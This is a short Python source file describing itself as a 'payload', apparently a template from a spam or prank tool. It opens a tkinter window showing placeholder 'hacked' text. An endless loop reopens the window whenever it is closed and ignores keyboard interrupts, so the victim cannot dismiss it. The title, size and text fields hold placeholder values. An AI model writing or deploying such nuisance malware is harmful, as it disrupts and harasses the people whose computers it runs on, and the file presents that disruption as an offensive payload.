# -*- coding: utf-8 -*-
"""
A full fledged payload that opens up an impossible to close window.

@author: Mr. Shark Spam Bot
"""
import tkinter

while True:
    try:

        # Create the window.
        window = tkinter.Tk()
        window.title('''WT''')
        WINDOW_HEIGHT = 'WH'
        WINDOW_WIDTH = 'WW'
        window.geometry(WINDOW_HEIGHT + 'x' + WINDOW_WIDTH)

        # Add the text.
        TEXT = '''T'''
        hacked_letter = tkinter.Text(window, height=WINDOW_HEIGHT, width=WINDOW_WIDTH)
        hacked_letter.pack()
        hacked_letter.insert(tkinter.END, TEXT)
        hacked_letter.config(state='disabled')
        tkinter.mainloop()

    except KeyboardInterrupt:
        continue
